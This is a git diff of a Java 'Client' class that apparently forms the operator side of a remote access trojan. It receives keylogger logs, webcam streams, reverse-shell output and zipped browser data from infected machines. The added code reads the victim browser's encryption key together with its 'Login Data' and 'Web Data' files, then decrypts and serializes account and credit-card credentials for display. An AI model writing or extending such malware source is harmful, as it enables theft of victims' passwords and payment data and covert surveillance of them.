@@ -1,26 +1,32 @@
 package Server;
 
+import Packets.Credentials.AccountCredentials;
+import Packets.Credentials.CombinedCredentials;
+import Packets.Credentials.CreditCardCredentials;
 import Packets.Identificators.Category;
 import Packets.Identificators.Response;
 import Packets.SysNetInfo.NetworkInformation;
 import Packets.SysNetInfo.SystemInformation;
 import Updater.UpdaterInterface;
+import Utils.CredentialsDumper;
 import Utils.FileWriterTask;
 import Utils.Time;
+import com.fasterxml.jackson.core.JsonProcessingException;
 import org.eclipse.jetty.util.IO;
 import org.eclipse.jetty.websocket.api.Session;
 import org.json.JSONObject;
 
+import java.io.File;
 import java.io.IOException;
 import java.nio.ByteBuffer;
+import java.nio.file.Files;
 import java.nio.file.Path;
-import java.util.HashMap;
-import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import java.util.function.Consumer;
 import Utils.UniqueByteIDGenerator;
+import com.fasterxml.jackson.databind.ObjectMapper;
+
 
 public class Client {
     private final Session session;
@@ -30,7 +36,6 @@ public class Client {
     private boolean isWebcamDialogOpen;
     private final UniqueByteIDGenerator uniqueByteIDGeneratorIn = new UniqueByteIDGenerator();
     private final UniqueByteIDGenerator uniqueByteIDGeneratorOut = new UniqueByteIDGenerator();
-    private final Map<Response, Consumer<JSONObject>> mapOfResponses = new HashMap<>();
     private final ConcurrentHashMap<Byte, BytesChannel> activeChannels = new ConcurrentHashMap<>();
 
     public ConcurrentHashMap<Byte, BytesChannel> getFileChannels() {
@@ -40,7 +45,6 @@ public class Client {
     public Client(Session session) {
         this.session = session;
         this.updater = ConnectionStore.updaterFactory.createInstance();
-        setupMapOfResponses();
     }
 
     public BytesChannel createFileChannel(Category category) {
@@ -54,7 +58,10 @@ public class Client {
         switch (bytesChannel.getCategory()) {
             case ZIP_FILE, WEBCAM_LOGS, KEYLOGGER_LOGS -> {
                 String outputFolder = writeFile(finalData, bytesChannel.getCategoryOutputFolder());
-                updater.showDownloadedFiles(outputFolder);
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("RESPONSE", "SHOW_DOWNLOADED");
+                jsonObject.put("path", outputFolder);
+                updater.processMessage(jsonObject.toString());
                 closeFileChannel(bytesChannel.getId());
             }
             case WEBCAM_STREAMING -> {
@@ -66,9 +73,12 @@ public class Client {
                 bytesChannel.getBuffer().clear();
             }
             case BROWSER_CREDENTIALS -> {
-                String outputPath = unzipCredentialsAndGetPath(finalData, bytesChannel.getCategoryOutputFolder());
+                JSONObject outputJSON = new JSONObject(unzipCredentialsAndGetPath(finalData, bytesChannel.getCategoryOutputFolder()));
                 closeFileChannel(bytesChannel.getId());
-                updater.updateCredentialsDumper(outputPath);
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("RESPONSE", "DUMP_CREDENTIALS");
+                jsonObject.put("info", outputJSON);
+                updater.processMessage(jsonObject.toString());
             }
         }
         // closeFileChannel(bytesChannel.getId());
@@ -83,27 +93,10 @@ public class Client {
     }
 
 
-    private void setupMapOfResponses() {
-        mapOfResponses.put(Response.SYS_NET_INFO, updater::addRowOfNewConnection);
-        mapOfResponses.put(Response.DISKS, updater::updateDisks);
-        mapOfResponses.put(Response.DIRECTORY, updater::updateDirectory);
-        mapOfResponses.put(Response.WEBCAM_DEVICES, updater::updateWebcamDevices);
-        mapOfResponses.put(Response.SCREEN_DIMENSIONS, updater::setScreenDimensions);
-        mapOfResponses.put(Response.MONITORS, updater::updateMonitors);
-        mapOfResponses.put(Response.SHELL, updater::updateReverseShell);
-        mapOfResponses.put(Response.PERMISSIONS, updater::showPermissionStatus);
-    }
 
 
-    public void processMessage(String message) {
-        JSONObject object = new JSONObject(message);
-        Consumer<JSONObject> action = mapOfResponses.get(Response.valueOf(object.getString("RESPONSE")));
-        if (action != null) {
-            action.accept(object);
-        } else {
-            System.out.println("Action not found!");
-        }
-    }
+
+
 
     public String writeFile(byte[] data, String category) {
         String finalNameOfFolder = category + " - " + new Time().getTime();
@@ -118,8 +111,28 @@ public class Client {
         Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
         FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
         task.unzipFileInMemory();
-        return pathOfDownload.toString();
+        byte[] secretKeyBytes;
+        try {
+            secretKeyBytes = Files.readAllBytes(new File(pathOfDownload + "\\Encryption Key").toPath());
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        return getString(secretKeyBytes, pathOfDownload);
     }
+
+    private static String getString(byte[] secretKeyBytes, Path pathOfDownload) {
+        CredentialsDumper credentialsDumper = new CredentialsDumper(secretKeyBytes, pathOfDownload + "\\Login Data", pathOfDownload + "\\Web Data");
+        CombinedCredentials combinedCredentials = credentialsDumper.getCredentials();
+        ObjectMapper objectMapper = new ObjectMapper();
+        String result;
+        try {
+            result = objectMapper.writeValueAsString(combinedCredentials);
+        } catch (JsonProcessingException e) {
+            throw new RuntimeException(e);
+        }
+        return result;
+    }
+
 
     public String getSessionFolder() {
         return "Session - " + getIdentifier();
@@ -154,14 +167,6 @@ public class Client {
         return uniqueByteIDGeneratorOut;
     }
 
-
-    public SystemInformation getSysInfo() {
-        return updater.getSystemInformation();
-    }
-
-    public NetworkInformation getNetInfo() {
-        return updater.getNetworkInformation();
-    }
 
     public ExecutorService getExecutor() {
         return executor;
